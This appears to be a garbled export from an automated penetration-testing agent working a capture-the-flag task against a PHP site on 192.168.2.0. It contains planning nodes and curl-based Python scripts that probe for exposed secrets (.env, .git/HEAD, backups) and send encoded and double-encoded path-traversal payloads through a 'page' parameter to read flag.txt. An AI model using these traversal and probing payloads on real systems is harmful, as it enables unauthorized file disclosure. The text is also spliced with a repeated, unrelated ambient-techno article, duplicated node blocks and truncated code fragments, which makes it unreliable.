nodes.expected_observation: No candidate is available for targeted inventory, and at least one discovery result is incomplete, unparsable, or otherwise insufficient for a coverage conclusion.

nodes.expected_observation: The inventory may identify exposed services or may record that none were identified in the covered ports; the candidate set and scan coverage are available for parent assessment.

nodes.expected_observation: Responsive hosts and service metadata may identify one or more candidates; alternatively, no candidates may be observed or the discovery evidence may be incomplete.
nodes.goal: Within the task-provided 192.168.2.0/24 scope, discover responsive hosts and observe their exposed services. The target identity and hosted service are unknown inputs; use the task scope as the discovery source.
nodes.stop_condition: Finish when the in-scope discovery results and their coverage limitations are recorded.
nodes.success_criteria: Record the observed responsive endpoints and service evidence, or establish that this discovery produced no usable candidate evidence.

nodes.expected_observation: The evidence may support one or more candidate endpoints, or may be too sparse or ambiguous to identify a candidate.
nodes.goal: Assess the initial in-scope host and service observations to determine whether there are candidate endpoints worth investigating as the target.
nodes.stop_condition: Finish when candidate evidence is sufficient to proceed or the need for further in-scope discovery is established.
nodes.success_criteria: Determine from observed endpoint and service evidence whether at least one candidate can be investigated without asserting an unverified target identity.

nodes.expected_observation: Additional candidate endpoints or service evidence may be found; alternatively, this discovery may yield no usable candidate evidence or remain incomplete.
nodes.goal: Use the initial discovery findings and observed network context to pursue additional in-scope discovery of responsive hosts and hosted services in 192.168.2.0/24. Do not treat an earlier negative or incomplete result as proof that no target exists.
nodes.stop_condition: Finish when follow-up discovery has produced candidate evidence or its available findings and limitations are recorded.
nodes.success_criteria: Record any newly observed candidate endpoints and service evidence, or document that follow-up discovery did not produce usable candidates and why.

nodes.expected_observation: Follow-up evidence may support one or more candidates, or may remain insufficient to identify a candidate.
nodes.goal: Assess the follow-up discovery evidence to decide whether observed endpoints or services provide a reasonable basis for investigating the hosted target.
nodes.stop_condition: Finish when the follow-up evidence supports further service investigation or remains insufficient.
nodes.success_criteria: Determine whether observed candidate endpoints can be investigated further, while preserving uncertainty about target identity where evidence is inconclusive.

nodes.expected_observation: Service interaction may identify a viable access path and evidence linking a candidate to the target; it may instead reveal further service leads, or fail to provide a usable path.
nodes.goal: Interact with the observed hosted service or services on the candidate endpoint or endpoints within 192.168.2.0/24. Use their observed behavior to identify a relevant access path toward the target system's root-level flag.txt file.
nodes.stop_condition: Finish when a viable access lead is documented or the findings indicate that another service-focused investigation is warranted.
nodes.success_criteria: Record service responses and determine whether they provide a supported access path to investigate, distinguishing observed evidence from hypotheses.

nodes.expected_observation: Alternative service evidence may establish an access path; it may also leave the path unresolved.
nodes.goal: Use the accumulated candidate and service observations to investigate other relevant, evidence-supported ways to interact with the hosted service and reach the target system, remaining within 192.168.2.0/24.
nodes.stop_condition: Finish when an alternative access path is identified or the available service evidence remains insufficient to support one.
nodes.success_criteria: Record whether an alternative, evidence-supported access path is available and the observations supporting that conclusion.

nodes.expected_observation: The root-level file may be readable and its contents verifiable, or access may fail or produce incomplete evidence.
nodes.goal: Using the established service-based access path, access and verify the contents of flag.txt in the root directory of the identified target system.
nodes.stop_condition: Finish when the file contents and path are verified, or when the observed access result warrants investigation of an alternative access path.
nodes.success_criteria: Obtain evidence that the observed file is flag.txt in the target system's root directory and capture its contents; a successful connection or session alone is insufficient.

nodes.expected_observation: An alternative path may become supportable, or available evidence may remain insufficient to access and verify the file.
nodes.goal: Based on the failed or incomplete initial file-access evidence, investigate other supported access paths arising from the observed target and service evidence, without expanding the target scope.
nodes.stop_condition: Finish when an alternative access path is ready for file verification or the investigation remains inconclusive.
nodes.success_criteria: Record a distinct, evidence-supported alternative access path if found, or document why the observed evidence does not support one.

nodes.expected_observation: The alternative path may provide verifiable file contents, or access may remain unsuccessful or incomplete.
nodes.goal: Use the alternative access path to access and verify flag.txt in the root directory of the identified target system.
nodes.stop_condition: Finish when the file contents and path are verified or the alternative access attempt leaves the task objective unresolved.
nodes.success_criteria: Obtain evidence that the observed file is flag.txt in the target system's root directory and capture its contents.

nodes.expected_observation: Verified file contents and evidence identifying the target and root-level file.
nodes.goal: Mark completion only when evidence verifies the contents of flag.txt at the root directory of the target system.
nodes.stop_condition: End this path after recording the verified task result.
nodes.success_criteria: The required root-level flag.txt contents have been observed and verified.

nodes.expected_observation: Discovery, service, or access evidence remains absent, incomplete, or inconclusive.
nodes.goal: Record that available in-scope evidence does not establish the target or verify access to its root-level flag.txt.

nodes.goal: Interact with the observed HTTP/PHP service at 192.168.2.0 by retrieving its main page, recording response headers and body, and examining advertised links, forms, scripts, and service metadata such as robots.txt or sitemap.xml. Follow relevant advertised functionality sufficiently to identify any service-supported route toward the target system's root-level flag.txt.
nodes.stop_condition: Finish the service-surface interaction and record its observed responses and limitations.
nodes.success_criteria: Document the HTTP responses and observed application surface. Identify a file-oriented interface for targeted testing, or a distinct actionable access lead; do not treat a successful request alone as proof of access to flag.txt.

nodes.expected_observation: The request may return readable flag-file content, another response, or no usable response.
nodes.goal: Interact with the observed HTTP service by requesting the in-scope web resource /flag.txt and recording the response status, headers, body, and transfer or parsing errors. Assess only whether this request returns evidence of the requested file; do not equate the web path with a confirmed filesystem path.
nodes.stop_condition: Finish this direct resource request and record the observed response and its limitations.
nodes.success_criteria: Preserve the actual response. Treat returned file content as access evidence only when the response supports that interpretation; a denial, missing resource, or transport failure rules out this request result only.

nodes.expected_observation: Responses may reveal a file-handling route or other actionable access lead, or may provide no relevant lead among the resources examined.
nodes.goal: Investigate the observed HTTP/PHP service for additional in-scope application resources beyond those advertised on its main page. Use service responses and metadata to guide requests to relevant conventional web resources and PHP application paths; record each response and avoid treating a small candidate set as exhaustive.

import json
from html.parser import HTMLParser
from urllib.parse import urljoin, urlsplit, urldefrag

from framework_evidence import run_tool

BASE = "http://192.168.2.0/"
ORIGIN = ("http", "192.168.2.0")


class SurfaceParser(HTMLParser):
    def __init__(self):
        super().__init__(convert_charrefs=True)
        self.links = []
        self.scripts = []
        self.forms = []
        self._form = None

    def handle_starttag(self, tag, attrs):
        attrs = dict(attrs)
        if tag.lower() in ("a", "area", "link"):
            self.links.append({"tag": tag.lower(), "attributes": attrs})
        elif tag.lower() == "script":
            self.scripts.append(attrs)
        elif tag.lower() == "form":
            self._form = {"attributes": attrs, "inputs": []}
            self.forms.append(self._form)
        elif self._form is not None and tag.lower() in ("input", "select", "textarea", "button"):
            self._form["inputs"].append({"tag": tag.lower(), "attributes": attrs})

    def handle_endtag(self, tag):
        if tag.lower() == "form":
            self._form = None


def response_body(raw):
    # curl -i may include headers for redirects. Locate the separator after the
    # final HTTP status line; retain the untouched raw stream in the envelope.
    status_at = raw.rfind("HTTP/")
    if status_at < 0:
        return raw
    crlf = raw.find("\r\n\r\n", status_at)
    lf = raw.find("\n\n", status_at)
    candidates = [p for p in (crlf, lf) if p >= 0]
    if not candidates:
        return ""
    pos = min(candidates)
    width = 4 if raw.startswith("\r\n\r\n", pos) else 2
    return raw[pos + width:]


def same_origin(url):
    p = urlsplit(url)
    return (p.scheme, p.netloc) == ORIGIN


def fetch(url, records):
    # Explicit argv through the supplied evidence wrapper; no shell is used.
    envelope = run_tool(["curl", "-sS", "-L", "-i", "--max-time", "30", "--max-redirs", "5", url])
    records.append({"requested_url": url, "envelope": envelope})
    stdout = envelope.get("stdout", "") if isinstance(envelope, dict) else ""
    if not isinstance(stdout, str):
        stdout = str(stdout)
    body = response_body(stdout)
    return {"requested_url": url, "body": body, "envelope_index": len(records) - 1}


def main():
    records = []
    fetched = {}
    root = fetch(BASE, records)
    fetched[BASE] = root

    parser = SurfaceParser()
    parser.feed(root["body"])

    observed = {"main_page": {"url": BASE, "body": root["body"]},
                "advertised_links": parser.links,
                "advertised_scripts": parser.scripts,
                "forms": parser.forms,
                "metadata_resources": [],
                "followed_advertised_resources": [],
                "limitations": ["Forms were inspected but not submitted.",
                                "Only same-origin advertised URLs were requested."]}

    # Request the explicitly relevant metadata endpoints, preserving individual
    # outcomes even when a resource is missing or the request fails.
    for path in ("robots.txt", "sitemap.xml"):
        url = urljoin(BASE, path)
        result = fetch(url, records)
        fetched[url] = result
        observed["metadata_resources"].append({"url": url, "body": result["body"],
                                                "envelope_index": result["envelope_index"]})

    # Examine advertised same-origin links, script sources, and form actions.
    # A GET form action is fetched without inventing or submitting field values;
    # non-GET forms are recorded but not invoked.
    candidates = []
    for item in parser.links:
        href = item["attributes"].get("href")
        if href:
            candidates.append(("link", urljoin(BASE, href)))
    for attrs in parser.scripts:
        src = attrs.get("src")
        if src:
            candidates.append(("script", urljoin(BASE, src)))
    for form in parser.forms:
        attrs = form["attributes"]
        action = urljoin(BASE, attrs.get("action") or BASE)
        method = (attrs.get("method") or "get").lower()
        form["resolved_action"] = action
        form["method"] = method
        if method == "get":
            candidates.append(("get_form_action_without_field_submission", action))

    scheduled = []
    seen = set()
    for source, url in candidates:
        url = urldefrag(url)[0]
        if same_origin(url) and url not in seen:
            seen.add(url)
            scheduled.append((source, url))

    for source, url in scheduled:
        result = fetch(url, records)
        fetched[url] = result
        entry = {"source": source, "url": url, "body": result["body"],
                 "envelope_index": result["envelope_index"]}
        observed["followed_advertised_resources"].append(entry)
        # Parse fetched HTML to record further advertised functionality. Do not
        # recursively crawl it; these findings help identify relevant leads.
        child_parser = SurfaceParser()
        child_parser.feed(result["body"])
        entry["advertised_links"] = child_parser.links
        entry["advertised_scripts"] = child_parser.scripts
        entry["forms"] = child_parser.forms

    output = {"evidence_version": 1, "tool_runs": records, "observations": observed}
    print(json.dumps(output, ensure_ascii=False))


if __name__ == "__main__":
    main()

Ambient Techno Music

Ambient techno is a genre of electronic music that blends the rhythmic elements of techno with the atmospheric and immersive qualities of ambient music. It often employs a slower tempo and incorporates deep, layered sounds to create a textured auditory experience. Ambient techno allows artists to explore and execute creative soundscapes in order to evoke various moods and emotions, such as relaxation, introspection, and transcendence.

In its current form, the genre includes the use of various electronic instruments and digital production techniques, such as synthesizers, drum machines, and software effects. The effect can range from a calming background ambiance to an engaging and thought-provoking auditory journey, depending on the creativity of the artists and the sophistication of the production techniques implemented.

According to a study in 2023, ambient techno has seen a resurgence in popularity, with many artists and listeners drawn to its unique blend of rhythm and atmosphere.

import json
from urllib.parse import urlencode
import framework_evidence

base = "http://192.168.2.0/index.php"
values = [
    ("filename", "flag.txt"),
    ("absolute_path", "/flag.txt"),
    ("root_traversal", "../../../../flag.txt"),
]
results = []
for label, value in values:
    url = base + "?" + urlencode({"page": value})
    argv = ["curl", "-sS", "-L", "-i", "--max-time", "20", "--max-redirs", "5", url]
    try:
        envelope = framework_evidence.run_tool(argv)
        results.append({"label": label, "request_value": value, "requested_url": url, "envelope": envelope})
    except Exception as exc:
        results.append({"label": label, "request_value": value, "requested_url": url,
                        "error": type(exc).__name__ + ": " + str(exc)})
print(json.dumps({"purpose": "Targeted flag.txt requests through the observed PHP page-selection interface; response content is evidence, not an assumed result.",
                  "target": base, "results": results}, ensure_ascii=False))

import json
import sys

import framework_evidence

BASE = "http://192.168.2.0"
PATHS = [
    "/flag.txt",
    "/.git/HEAD",
    "/.env",
    "/backup.zip",
    "/backup.tar.gz",
    "/config.php.bak",
    "/phpinfo.php",
    "/server-status",
    "/uploads/",
    "/admin/",
]

results = []
for path in PATHS:
    url = BASE + path
    argv = [
        "curl", "-sS", "-i", "-L",
        "--max-time", "20",
        "--max-redirs", "3",
        url,
    ]
    try:
        envelope = framework_evidence.run_tool(argv)
        results.append({"requested_path": path, "requested_url": url, "envelope": envelope})
    except Exception as exc:
        results.append({
            "requested_path": path,
            "requested_url": url,
            "helper_error": type(exc).__name__ + ": " + str(exc),
        })

print(json.dumps({"evidence_version": 1, "target": BASE, "requests": results}, ensure_ascii=False))

b22c9e3bfc2a6183a09ce078aec55f44ceed707b.content:
import json

import framework_evidence


BASE = "http://192.168.2.0/index.php?page="
REQUESTS = [
    ("valid_page_control", "page1.php"),
    ("encoded_dots_and_slashes", "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fflag.txt"),
    ("encoded_slashes_uppercase", "..%2F..%2F..%2F..%2Fflag.txt"),
    ("double_encoded_dots_and_slashes", "%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fflag.txt"),
    ("mixed_single_and_double_encoding", "..%252f..%2f..%252f..%2fflag.txt"),
    ("encoded_filename_separator", "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fflag%2etxt"),
    ("dot_segment_and_repeated_slashes", "....//....//....//....//flag.txt"),
]

results = []
for label, value in REQUESTS:
    url = BASE + value
    argv = [
        "curl", "-sS", "-i", "-L", "--max-time", "20",
        "--max-redirs", "3", url,
    ]
    try:
        envelope = framework_evidence.run_tool(argv)
        results.append({
            "label": label,
            "request_value": value,
            "requested_url": url,
            "tool_envelope": envelope,
        })
    except Exception as exc:
        results.append({
            "label": label,
            "request_value": value,
            "requested_url": url,
            "execution_error": repr(exc),
        })

print(json.dumps({"experiment": "PHP page parameter encoding and normalization", "results": results}, ensure_ascii=False))
b22c9e3bfc2a6183a09ce078aec55f44ceed707b.expected_result: JSON output records each request value, URL, and curl evidence envelope, including raw response streams and status. Responses can be compared with the valid-page control; only demonstrated target-file contents or usable local-file access would establish an access path. Rejections apply only to the tested variants.
b22c9e3bfc2a6183a09ce078aec55f44ceed707b.reason: The observed PHP blog accepts a `page` parameter, but literal filenames and ordinary traversal returned the blog shell with “Page not found.” This experiment sends distinct encoded and normalized traversal forms, plus a valid-page comparison, to observe how that interface handles them. It records the exact inputs and the raw tool envelopes without treating a generic blog response as file access.

Ambient Techno Music

Ambient techno is a genre of electronic music that blends the rhythmic elements of techno with the atmospheric and immersive qualities of ambient music. It often employs a slower tempo and incorporates deep, layered sounds to create a textured auditory experience. Ambient techno allows artists to explore and execute creative soundscapes in order to evoke various moods and emotions, such as relaxation, introspection, and transcendence.

In its current form, the genre includes the use of various electronic instruments and digital production techniques, such as synthesizers, drum machines, and software effects. The effect can range from a calming background ambiance to an engaging and thought-provoking auditory journey, depending on the creativity of the artists and the sophistication of the production techniques implemented.

According to a study in 2023, ambient techno has seen a resurgence in popularity, with many artists and listeners drawn to its unique blend of rhythm and atmosphere.

import json
import sys

import framework_evidence

TARGET = "http://192.168.2.0"
# Conventional PHP source-display suffix corresponding to the known index.php.
resource = {
    "source_resource": "/index.php",
    "requested_path": "/index.phps",
    "requested_url": TARGET + "/index.phps",
    "method": "GET",
    "purpose": "Check the PHP source-display (.phps) handler for the known index.php entry point.",
}

argv = [
    "curl", "-sS", "-i", "-L", "--max-time", "20", "--max-redirs", "3",
    resource["requested_url"],
]
try:
    envelope = framework_evidence.run_tool(argv)
    result = {
        "evidence_version": 1,
        "target": TARGET,
        "checked_resource": resource,
        "advertised_php_routes": [],
        "route_coverage": (
            "No exact advertised PHP route names were recoverable from the supplied "
            "partial/truncated observations; only the known index.php entry point was checked."
        ),
        "tool_evidence": envelope,
        "interpretation_note": (
            "Use the retained response status, headers, and body to determine whether "
            "source was displayed, ordinary content was returned, the resource was "
            "unavailable, or the evidence is incomplete. A tool exit status alone does "
            "not establish source disclosure."
        ),
    }
    print(json.dumps(result, ensure_ascii=False))
except Exception as exc:
    result = {
        "evidence_version": 1,
        "target": TARGET,
        "checked_resource": resource,
        "advertised_php_routes": [],
        "route_coverage": (
            "No exact advertised PHP route names were recoverable from the supplied "
            "partial/truncated observations."
        ),
        "execution_error": {"type": type(exc).__name__, "message": str(exc)},
        "interpretation_note": "No HTTP response evidence was obtained; the check is incomplete.",
    }
    print(json.dumps(result, ensure_ascii=False))
    sys.exit(1)

nodes.expected_observation: Responsive hosts and service metadata may identify one or more candidates; alternatively, no candidates may be observed or the discovery evidence may be incomplete.
nodes.goal: Within the task-provided 192.168.2.0/24 scope, discover responsive hosts and observe their exposed services. The target identity and hosted service are unknown inputs; use the task scope as the discovery source.
nodes.stop_condition: Finish when the in-scope discovery results and their coverage limitations are recorded.
nodes.success_criteria: Record the observed responsive endpoints and service evidence, or establish that this discovery produced no usable candidate evidence.

nodes.expected_observation: The evidence may support one or more candidate endpoints, or may be too sparse or ambiguous to identify a candidate.
nodes.goal: Assess the initial in-scope host and service observations to determine whether there are candidate endpoints worth investigating as the target.
nodes.stop_condition: Finish when candidate evidence is sufficient to proceed or the need for further in-scope discovery is established.
nodes.success_criteria: Determine from observed endpoint and service evidence whether at least one candidate can be investigated without asserting an unverified target identity.

nodes.expected_observation: Additional candidate endpoints or service evidence may be found; alternatively, this discovery may yield no usable candidate evidence or remain incomplete.
nodes.goal: Use the initial discovery findings and observed network context to pursue additional in-scope discovery of responsive hosts and hosted services in 192.168.2.0/24. Do not treat an earlier negative or incomplete result as proof that no target exists.
nodes.stop_condition: Finish when follow-up discovery has produced candidate evidence or its available findings and limitations are recorded.
nodes.success_criteria: Record any newly observed candidate endpoints and service evidence, or document that follow-up discovery did not produce usable candidates and why.

nodes.expected_observation: Follow-up evidence may support one or more candidates, or may remain insufficient to identify a candidate.
nodes.goal: Assess the follow-up discovery evidence to decide whether observed endpoints or services provide a reasonable basis for investigating the hosted target.
nodes.stop_condition: Finish when the follow-up evidence supports further service investigation or remains insufficient.
nodes.success_criteria: Determine whether observed candidate endpoints can be investigated further, while preserving uncertainty about target identity where evidence is inconclusive.

nodes.expected_observation: Service interaction may identify a viable access path and evidence linking a candidate to the target; it may instead reveal further service leads, or fail to provide a usable path.
nodes.goal: Interact with the observed hosted service or services on the candidate endpoint or endpoints within 192.168.2.0/24. Use their observed behavior to identify a relevant access path toward the target system's root-level flag.txt file.
nodes.stop_condition: Finish when a viable access lead is documented or the findings indicate that another service-focused investigation is warranted.
nodes.success_criteria: Record service responses and determine whether they provide a supported access path to investigate, distinguishing observed evidence from hypotheses.

nodes.expected_observation: Alternative service evidence may establish an access path; it may also leave the path unresolved.
nodes.goal: Use the accumulated candidate and service observations to investigate other relevant, evidence-supported ways to interact with the hosted service and reach the target system, remaining within 192.168.2.0/24.
nodes.stop_condition: Finish when an alternative access path is identified or the available service evidence remains insufficient to support one.
nodes.success_criteria: Record whether an alternative, evidence-supported access path is available and the observations supporting that conclusion.

nodes.expected_observation: The root-level file may be readable and its contents verifiable, or access may fail or produce incomplete evidence.
nodes.goal: Using the established service-based access path, access and verify the contents of flag.txt in the root directory of the identified target system.
nodes.stop_condition: Finish when the file contents and path are verified, or when the observed access result warrants investigation of an alternative access path.
nodes.success_criteria: Obtain evidence that the observed file is flag.txt in the target system's root directory and capture its contents; a successful connection or session alone is insufficient.

nodes.expected_observation: An alternative path may become supportable, or available evidence may remain insufficient to access and verify the file.
nodes.goal: Based on the failed or incomplete initial file-access evidence, investigate other supported access paths arising from the observed target and service evidence, without expanding the target scope.
nodes.stop_condition: Finish when an alternative access path is ready for file verification or the investigation remains inconclusive.
nodes.success_criteria: Record a distinct, evidence-supported alternative access path if found, or document why the observed evidence does not support one.

nodes.expected_observation: The alternative path may provide verifiable file contents, or access may remain unsuccessful or incomplete.
nodes.goal: Use the alternative access path to access and verify flag.txt in the root directory of the identified target system.
nodes.stop_condition: Finish when the file contents and path are verified or the alternative access attempt leaves the task objective unresolved.
nodes.success_criteria: Obtain evidence that the observed file is flag.txt in the target system's root directory and capture its contents.

nodes.expected_observation: Verified file contents and evidence identifying the target and root-level file.
nodes.goal: Mark completion only when evidence verifies the contents of flag.txt at the root directory of the target system.
nodes.stop_condition: End this path after recording the verified task result.
nodes.success_criteria: The required root-level flag.txt contents have been observed and verified.

nodes.expected_observation: Discovery, service, or access evidence remains absent, incomplete, or inconclusive.
nodes.goal: Record that available in-scope evidence does not establish the target or verify access to its root-level flag.txt.
nodes.stop_condition: End this path after recording the unresolved evidence and its limitations.
nodes.success_criteria: Preserve the observed findings and state that the task objective is unresolved, without treating a negative result from one investigation as proof that all alternatives are unavailable.

nodes.expected_observation: The homepage and advertised routes may reveal a supported file-verification path or provide no such lead.

Ambient Techno Music

Ambient techno is a genre of electronic music that blends the rhythmic elements of techno with the atmospheric and immersive qualities of ambient music. It often employs a slower tempo and incorporates deep, layered sounds to create a textured auditory experience. Ambient techno allows artists to explore and execute creative soundscapes in order to evoke various moods and emotions, such as relaxation, introspection, and transcendence.

In its current form, the genre includes the use of various electronic instruments and digital production techniques, such as synthesizers, drum machines, and software effects. The effect can range from a calming background ambiance to an engaging and thought-provoking auditory journey, depending on the creativity of the artists and the sophistication of the production techniques implemented.

According to a study in 2023, ambient techno has seen a resurgence in popularity, with many artists and listeners drawn to its unique blend of rhythm and atmosphere.

import base64
import hashlib
import http.client
import json
import re
import sys
from html.parser import HTMLParser
from urllib.parse import urljoin, urlsplit, urldefrag

START_URL = "http://192.168.2.0/"
USER_AGENT = "route-capture/1.0"
ACCEPT = "text/html,application/xhtml+xml,text/css,application/javascript,*/*;q=0.8"


def origin(url):
    p = urlsplit(url)
    port = p.port or (443 if p.scheme.lower() == "https" else 80)
    return p.scheme.lower(), (p.hostname or "").lower(), port


def absolute(base, value):
    if not value:
        return None
    value = value.strip()
    if not value or value.startswith(("javascript:", "data:", "mailto:", "tel:", "#")):
        return None
    return urldefrag(urljoin(base, value))[0]


class PageParser(HTMLParser):
    def __init__(self):
        super().__init__(convert_charrefs=True)
        self.links = []
        self.forms = []
        self.resources = []
        self.base_href = None

    def handle_starttag(self, tag, attrs):
        a = {k.lower(): (v or "") for k, v in attrs}
        tag = tag.lower()
        if tag == "base" and a.get("href") and self.base_href is None:
            self.base_href = a["href"]
        if tag == "a" and a.get("href"):
            self.links.append({"tag": tag, "href": a["href"], "text": ""})
        if tag == "form":
            self.forms.append({"action": a.get("action", ""), "method": a.get("method", "get").upper(),
                               "enctype": a.get("enctype", "application/x-www-form-urlencoded")})
        if tag in ("img", "script", "iframe", "source", "video", "audio", "embed", "input"):
            attr = "poster" if tag == "video" and a.get("poster") else "src"
            if a.get(attr):
                self.resources.append({"tag": tag, "attribute": attr, "url": a[attr]})
        if tag == "link" and a.get("href"):
            rel = a.get("rel", "").lower().split()
            self.links.append({"tag": "link", "href": a["href"], "rel": rel})
            if any(x in rel for x in ("stylesheet", "icon", "preload", "modulepreload", "manifest")):
                self.resources.append({"tag": "link", "attribute": "href", "rel": rel, "url": a["href"]})

    def handle_startendtag(self, tag, attrs):
        self.handle_starttag(tag, attrs)


CSS_URL = re.compile(r"url\(\s*(['\"]?)(.*?)\1\s*\)", re.I | re.S)
CSS_IMPORT = re.compile(r"@import\s+(?:url\()?\s*(['\"])(.*?)\1\s*\)?", re.I | re.S)


def charset_from(headers):
    for name, value in headers:
        if name.lower() == "content-type":
            m = re.search(r"charset\s*=\s*['\"]?([^;\s'\"]+)", value, re.I)
            if m:
                return m.group(1)
    return "utf-8"


def request_once(url):
    p = urlsplit(url)
    if p.scheme.lower() not in ("http", "https") or not p.hostname:
        raise ValueError("Unsupported URL scheme or missing host")
    port = p.port or (443 if p.scheme.lower() == "https" else 80)
    cls = http.client.HTTPSConnection if p.scheme.lower() == "https" else http.client.HTTPConnection
    conn = cls(p.hostname, port, timeout=20)
    target = p.path or "/"
    if p.query:
        target += "?" + p.query
    host_header = p.hostname
    default_port = 443 if p.scheme.lower() == "https" else 80
    if port != default_port:
        host_header += ":" + str(port)
    sent_headers = [("Host", host_header), ("User-Agent", USER_AGENT), ("Accept", ACCEPT),
                    ("Accept-Encoding", "identity"), ("Connection", "close")]
    try:
        conn.putrequest("GET", target, skip_host=True, skip_accept_encoding=True)
        for name, value in sent_headers:
            conn.putheader(name, value)
        conn.endheaders()
        response = conn.getresponse()
        body = response.read()
        headers = response.getheaders()
        record = {
            "request": {"method": "GET", "url": url, "request_target": target, "headers": sent_headers},
            "response": {"status": response.status, "reason": response.reason,
                         "headers": headers, "body_length_bytes": len(body),
                         "body_sha256": hashlib.sha256(body).hexdigest(),
                         "body_base64": base64.b64encode(body).decode("ascii"),
                         "body_text": body.decode(charset_from(headers), errors="replace")},

records = []
limitations = []
visited = set()
requested = set()


def fetch(url, purpose):
    url = urldefrag(url)[0]
    if url in requested:
        return None
    requested.add(url)
    current = url
    redirect_chain = set()
    final_body = None
    final_headers = []
    final_status = None
    while current not in redirect_chain:
        redirect_chain.add(current)
        try:
            record, body, headers, status = request_once(current)
            record["purpose"] = purpose
            record["discovered_url"] = url
            records.append(record)
        except Exception as exc:
            limitations.append({"url": current, "purpose": purpose,
                                "limitation": type(exc).__name__ + ": " + str(exc)})
            return None
        final_body, final_headers, final_status = body, headers, status
        location = next((v for k, v in headers if k.lower() == "location"), None)
        if status not in (301, 302, 303, 307, 308) or not location:
            break
        next_url = absolute(current, location)
        if not next_url or origin(next_url) != origin(START_URL):
            limitations.append({"url": current, "purpose": purpose,
                                "limitation": "Redirect was not followed because its Location was invalid or outside the homepage origin.",
                                "location": location})
            break
        if next_url in redirect_chain:
            limitations.append({"url": current, "purpose": purpose, "limitation": "Redirect cycle detected."})
            break
        current = next_url
    else:
        limitations.append({"url": url, "purpose": purpose, "limitation": "Redirect cycle detected."})
    return {"requested_url": url, "final_url": current, "body": final_body,
            "headers": final_headers, "status": final_status}


def inventory_html(capture, label):
    if not capture or capture["body"] is None:
        return {"label": label, "parse_status": "not_parsed", "links": [], "forms": [], "resources": []}
    headers = capture["headers"]
    ctype = next((v for k, v in headers if k.lower() == "content-type"), "")
    if "html" not in ctype.lower():
        return {"label": label, "parse_status": "not_html_content_type", "content_type": ctype,
                "links": [], "forms": [], "resources": []}
    text = capture["body"].decode(charset_from(headers), errors="replace")
    parser = PageParser()
    try:
        parser.feed(text)
        parser.close()
    except Exception as exc:
        limitations.append({"url": capture["final_url"], "limitation": "HTML parsing error: " + str(exc)})
    base = absolute(capture["final_url"], parser.base_href) if parser.base_href else capture["final_url"]
    links = []
    for item in parser.links:
        resolved = absolute(base or capture["final_url"], item.get("href", ""))
        entry = dict(item)
        entry["resolved_url"] = resolved
        entry["same_origin"] = bool(resolved and origin(resolved) == origin(START_URL))
        links.append(entry)
    resources = []
    for item in parser.resources:
        resolved = absolute(base or capture["final_url"], item.get("url", ""))
        entry = dict(item)
        entry["resolved_url"] = resolved
        entry["same_origin"] = bool(resolved and origin(resolved) == origin(START_URL))
        resources.append(entry)
    return {"label": label, "page_url": capture["final_url"], "parse_status": "parsed",
            "links": links, "forms": parser.forms, "resources": resources}

        if u not in route_urls:
            route_urls.append(u)

    route_inventories.append({"requested_route": u, **inv})

    result = {"url": u, "captured": cap is not None,

              "final_url": cap["final_url"] if cap else None}
    if cap and cap["body"] is not None:
        ctype = next((v for k, v in cap["headers"] if k.lower() == "content-type"), "")
        result["content_type"] = ctype
        if "css" in ctype.lower() or urlsplit(u).path.lower().endswith(".css"):

            refs = [m.group(2).strip() for m in CSS_URL.finditer(css_text)]

            for ref in refs:

            for ref in refs:

import json
import os
import sys

artifact = "llm_inputs/4e0a46b89d9080efb30b5c3df0399ec67424aced0569e35355268a4adcfa3ca8.json"
source_path = '$["dependency_results"][0]["observation"]["execution_result"]["stdout"]'


def emit(obj):
    print(json.dumps(obj, ensure_ascii=False))


absolute_artifact = os.path.abspath(artifact)
try:
    with open(artifact, "r", encoding="utf-8") as f:
        archive = json.load(f)
except FileNotFoundError:
    emit({
        "record_type": "archive_retrieval_limitation",
        "artifact": artifact,
        "resolved_path": absolute_artifact,
        "detail": "The specified archive artifact is not accessible at the supplied relative path from this execution's working directory. No alternate locations were searched.",
        "source_path": source_path,
        "evidence_unavailable": "The requested archived stdout and its HTTP exchange records were not retrieved."
    })
    sys.exit(0)
except (OSError, UnicodeError, json.JSONDecodeError) as exc:
    emit({
        "record_type": "archive_retrieval_limitation",
        "artifact": artifact,
        "resolved_path": absolute_artifact,
        "detail": "The specified artifact could not be read as UTF-8 JSON.",
        "error_type": type(exc).__name__,
        "error": str(exc),
        "source_path": source_path,
        "evidence_unavailable": "The requested archived stdout and its HTTP exchange records were not retrieved."
    })
    sys.exit(0)

try:
    stdout = archive["dependency_results"][0]["observation"]["execution_result"]["stdout"]
except (KeyError, IndexError, TypeError) as exc:
    emit({
        "record_type": "archive_retrieval_limitation",
        "artifact": artifact,
        "resolved_path": absolute_artifact,
        "detail": "The artifact was read, but the requested source path could not be resolved.",
        "source_path": source_path,
        "error_type": type(exc).__name__,
        "error": str(exc),
        "evidence_unavailable": "The requested archived stdout and its HTTP exchange records were not retrieved."
    })
    sys.exit(0)

if not isinstance(stdout, str):
    emit({
        "record_type": "archive_retrieval_limitation",
        "artifact": artifact,
        "resolved_path": absolute_artifact,
        "detail": "The requested source path exists, but its value is not a string stdout value.",
        "source_path": source_path,
        "observed_value_type": type(stdout).__name__,
        "evidence_unavailable": "The stdout text and its HTTP exchange records could not be presented."
    })
    sys.exit(0)

emit({
    "record_type": "archive_retrieval_status",
    "artifact": artifact,
    "resolved_path": absolute_artifact,
    "source_path": source_path,
    "retrieval_status": "stdout_retrieved",
    "stdout_character_count": len(stdout),
    "stdout_line_count": len(stdout.splitlines())
})

# Preserve each original line verbatim as a JSON string value; JSON escaping
# keeps bodies and other line content unambiguous and individually reviewable.
for number, line in enumerate(stdout.splitlines(), 1):
    emit({"record_type": "archived_stdout_line", "line_number": number, "exact_line": line})

if stdout == "":
    emit({
        "record_type": "archive_content_note",
        "detail": "The requested stdout value was retrieved and is empty; this does not establish that records are absent elsewhere."
    })

import base64
import http.client
import json

URL = "http://192.168.2.0/css/style.css"
HOST = "192.168.2.0"
PATH = "/css/style.css"

record = {
    "request_url": URL,
    "method": "GET",
    "http_status": None,
    "response_body_bytes_base64": None,
    "response_body_text": None,
    "response_body_encoding": None,
    "capture_limitation": None,
}
connection = http.client.HTTPConnection(HOST, 80, timeout=20)
try:
    connection.request("GET", PATH, headers={"Host": HOST, "Connection": "close"})
    response = connection.getresponse()
    record["http_status"] = response.status
    try:
        body = response.read()
        record["response_body_bytes_base64"] = base64.b64encode(body).decode("ascii")
        try:
            record["response_body_text"] = body.decode("utf-8")
